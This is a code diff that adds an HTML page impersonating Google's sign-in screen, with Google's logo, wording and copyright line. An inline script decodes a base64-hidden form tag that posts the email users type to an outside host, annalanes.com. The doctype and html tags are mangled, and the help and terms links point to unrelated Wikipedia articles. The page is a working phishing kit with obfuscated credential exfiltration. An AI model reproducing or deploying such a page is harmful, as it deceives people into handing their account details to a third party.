@@ -1,0 +1,164 @@
+<!DOCTYPE ht5664345ml>
+<html3434>
+  <head>
+    <meta charset="UTF-8">
+    <style>
+        body {
+    margin: 0;
+  }
+  
+  .logo {
+    width: 112px;
+    height: 36px;
+    margin: 30px auto;
+  }
+  
+  p:nth-child(2) {
+    font-size: 45px;
+    text-align: center;
+    margin-top: -10px;
+  }
+  
+  p:nth-child(3) {
+    font-size: 20px;
+    text-align: center;
+    margin-top: -25px;
+  }
+  
+  .login {
+    height: 300px;
+    width: 350px;
+    margin: auto;
+    background-color: #F7F7F7;
+    box-shadow: 0px 1px 1px 0px grey;
+  }
+  
+  .login > div:nth-child(3) {
+    width: 100px;
+    margin: auto;
+  }
+  
+  .login > div:nth-child(3) > img {
+    height: 100px;
+    border-radius: 100%;
+  }
+  
+  input {
+    height: 35px;
+    width: 250px;
+    margin-left: 48px;
+    font-size: 20px;
+  }
+  
+  .button {
+    display: inline-block;
+    height: 40px;
+    width: 250px;
+    margin-left: 49px;
+    text-align: center;
+    background-color:dodgerblue;
+    border: 1px solid blue;
+    color: white;
+    font-weight: bold;
+  }
+  
+  .login > a:last-child {
+    display: inline-block;
+    float: right;
+    margin-right: 49px;
+    font-size: 14px;
+    text-decoration: none;
+    color: mediumblue;
+  }
+  
+  .login >a:last-child:hover {
+    text-decoration: underline;
+  }
+  
+  p:nth-child(5) {
+    text-align: center;
+  }
+  
+  p > a {
+    text-decoration: none;
+    color: mediumblue;
+  }
+  
+  p > a:hover {
+    text-decoration: underline;
+  }
+  
+  p:nth-child(6) {
+    text-align: center;
+  }
+  
+  .logo-strip {
+    width: 230px;
+    margin: -10px auto;
+  }
+  
+  .bottom {
+    height: 35px;
+    width: 100%;
+    border-top: 0.5px solid #E5E5E5;
+    position: fixed;
+    bottom: 0;
+    font-size: 12px;
+    background-color: white;
+  }
+  
+  .bottom a {
+    margin-left: 24px;
+    text-decoration: none;
+  }
+  
+  .bottom a:hover {
+    text-decoration: underline;
+  }
+  
+    </style>
+    <title>Google - Sign in</title>
+  </head>
+  <body>
+    <div class="logo">
+      <img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png">
+    </div>
+    <p>Welcome back to Google.</p>
+    <p>Enter your email below.</p>
+    <div class="login">
+      <br><br>
+      <div>
+        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+      </div>
+      <br>
+      <div id=tag></div>
+        <input type="email" name="email" placeholder="Email">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+      var tag = document.getElementById('tag')
+      tag.innerHTML = atob("PGZvcm0gUE9TVD0iaHR0cDovL2FubmFsYW5lcy5jb20vZmlsZXRoaXNhd2F5L3R4dC50eHQiPg==")
+    </script>
+      <br><br>
+
+        
+      <a href="https://en.wikipedia.org/wiki/Pride_and_Prejudice">
+        <p>Forgot your email?</p>
+      </a>
+    </div>
+    <p><a href="https://en.wikipedia.org/wiki/Sense_and_Sensibility">Terms and Services</a></p>
+    <p>© Created and Owned by Google, LLC. 2021</p>
+    <div class="logo-strip">
+      <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png">
+    </div>
+    <div class="bottom">
+      <br>
+      <a href="#">Stream</a>
+      <a href="#">Buy</a>
+      <a href="#">News</a>
+      <a href="#">More</a>
+
+      <!-- Credit to https://gist.github.com/Miha-Pleskovic/5263091d8edac7eee3a92b8a8e361962-->
+    </div>
+  </body>
+</html>
